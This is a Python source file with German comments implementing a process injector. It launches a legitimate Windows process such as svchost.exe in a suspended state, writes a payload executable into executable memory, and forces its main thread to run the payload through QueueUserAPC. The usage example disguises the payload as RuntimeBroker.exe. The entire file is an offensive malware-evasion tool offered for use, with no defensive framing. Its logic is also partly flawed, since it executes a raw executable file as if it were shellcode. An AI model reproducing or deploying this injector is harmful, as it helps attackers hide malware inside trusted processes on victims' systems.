import ctypes
from ctypes import wintypes
import sys
import os

# --- Windows API Konstanten und Strukturen ---
# Wir benötigen eine umfangreichere Sammlung, um Prozesse zu manipulieren.

# Prozess-Erstellungs-Flags
CREATE_SUSPENDED = 0x00000004
DETACHED_PROCESS = 0x00000008

# Speicher-Flags
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40

# Nötige Strukturen für CreateProcessA
class STARTUPINFOA(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPSTR),
        ("lpDesktop", wintypes.LPSTR),
        ("lpTitle", wintypes.LPSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.POINTER(wintypes.BYTE)),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]

# --- Implementierung des Injectors ---

def run(target_process, payload_path):
    """
    Führt die Process Hollowing Technik durch.

    :param target_process: Der Pfad zum legitimen Prozess, der als Hülle dient (z.B. svchost.exe).
    :param payload_path: Der Pfad zur Payload (.exe), die injiziert werden soll.
    """
    if not os.path.exists(payload_path):
        print(f"[-] Fehler: Payload-Datei nicht gefunden unter {payload_path}")
        return

    print(f"[*] Starte den Hollowing-Prozess für: {target_process}")
    
    # Lese den Code unserer Payload-EXE
    with open(payload_path, "rb") as f:
        payload_buffer = f.read()
    
    payload_size = len(payload_buffer)
    print(f"[*] Payload-Größe: {payload_size} bytes")

    # Initialisiere die Strukturen für CreateProcessA
    startup_info = STARTUPINFOA()
    startup_info.cb = ctypes.sizeof(startup_info)
    process_info = PROCESS_INFORMATION()

    print(f"[*] Starte den Zielprozess im suspendierten Modus...")
    
    try:
        # Starte den Zielprozess. Er ist pausiert und wartet auf uns.
        created = ctypes.windll.kernel32.CreateProcessA(
            ctypes.c_char_p(target_process.encode('utf-8')),
            None,
            None,
            None,
            False,
            CREATE_SUSPENDED | DETACHED_PROCESS,
            None,
            None,
            ctypes.byref(startup_info),
            ctypes.byref(process_info)
        )

        if not created:
            print(f"[-] Fehler beim Erstellen des Prozesses: {ctypes.WinError().strerror}")
            return

    except Exception as e:
        print(f"[-] Kritischer Fehler bei CreateProcessA: {e}")
        return

    h_process = process_info.hProcess
    h_thread = process_info.hThread
    print(f"[+] Prozess erfolgreich erstellt. PID: {process_info.dwProcessId}, Handle: {h_process}")

    # Hier würde man normalerweise den Speicher des Zielprozesses "unmappen" (z.B. mit NtUnmapViewOfSection).
    # Für eine reine Python-Implementierung, die robust bleiben soll, ist das sehr komplex.
    # Ein einfacherer (aber technisch weniger "reiner") Ansatz ist, einfach neuen Speicher zu allozieren
    # und den Entry Point zu überschreiben.

    print(f"[*] Alloziere Speicher im Zielprozess...")
    remote_mem = ctypes.windll.kernel32.VirtualAllocEx(
        h_process,
        None,  # Lass das OS die Adresse wählen
        payload_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )

    if not remote_mem:
        print(f"[-] Fehler bei der Speicherallokation: {ctypes.WinError().strerror}")
        ctypes.windll.kernel32.TerminateProcess(h_process, 1)
        return

    print(f"[+] Speicher erfolgreich alloziert bei Addresse: {hex(remote_mem)}")

    print(f"[*] Schreibe die Payload in den Speicher des Zielprozesses...")
    bytes_written = ctypes.c_size_t(0)
    write_success = ctypes.windll.kernel32.WriteProcessMemory(
        h_process,
        remote_mem,
        payload_buffer,
        payload_size,
        ctypes.byref(bytes_written)
    )

    if not write_success or bytes_written.value != payload_size:
        print(f"[-] Fehler beim Schreiben in den Prozess-Speicher: {ctypes.WinError().strerror}")
        ctypes.windll.kernel32.TerminateProcess(h_process, 1)
        return
    
    print(f"[+] Payload erfolgreich in den Speicher geschrieben.")

    # Um den Thread-Kontext zu ändern, bräuchten wir die 32-bit oder 64-bit CONTEXT Struktur.
    # Ein alternativer, aggressiverer Weg ist die `QueueUserAPC` Technik,
    # die unsere Payload als "Asynchronous Procedure Call" in die Ausführungsschlange des Haupt-Threads zwingt.
    # Das ist oft zuverlässiger als SetThreadContext.

    print("[*] Zwinge den Haupt-Thread des Ziels, unsere Payload auszuführen...")
    
    # Wir casten die Adresse unseres Speichers zu einem Thread-Start-Routine-Pointer
    lp_thread_start_routine = ctypes.cast(remote_mem, ctypes.WINFUNCTYPE(wintypes.DWORD, wintypes.LPVOID))
    
    # Wir stellen unsere Payload in die Ausführungswarteschlange des Haupt-Threads
    apc_queued = ctypes.windll.kernel32.QueueUserAPC(
        lp_thread_start_routine,
        h_thread,
        None # Kein Parameter wird übergeben
    )

    if not apc_queued:
        print(f"[-] Fehler beim Einreihen des APC: {ctypes.WinError().strerror}")
        ctypes.windll.kernel32.TerminateProcess(h_process, 1)
        return

    print("[+] APC erfolgreich in die Warteschlange gestellt.")

    print("[*] Wecke den Prozess auf...")
    resumed = ctypes.windll.kernel32.ResumeThread(h_thread)
    if resumed == -1:
        print(f"[-] Fehler beim Aufwecken des Threads: {ctypes.WinError().strerror}")
        return
        
    print("[+] Operation 'Kuckuck' erfolgreich. Der Prozess läuft jetzt mit unserer Payload.")
    print("[+] Der Injector wird sich jetzt selbst terminieren.")

    # Aufräumen
    ctypes.windll.kernel32.CloseHandle(h_process)
    ctypes.windll.kernel32.CloseHandle(h_thread)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Benutzung: injector.py <Pfad_zum_Zielprozess> <Pfad_zur_Payload_EXE>")
        print(r"Beispiel: injector.py C:\Windows\System32\svchost.exe C:\Pfad\zur\RuntimeBroker.exe")
        sys.exit(1)

    target = sys.argv[1]
    payload = sys.argv[2]
    
    run(target, payload) 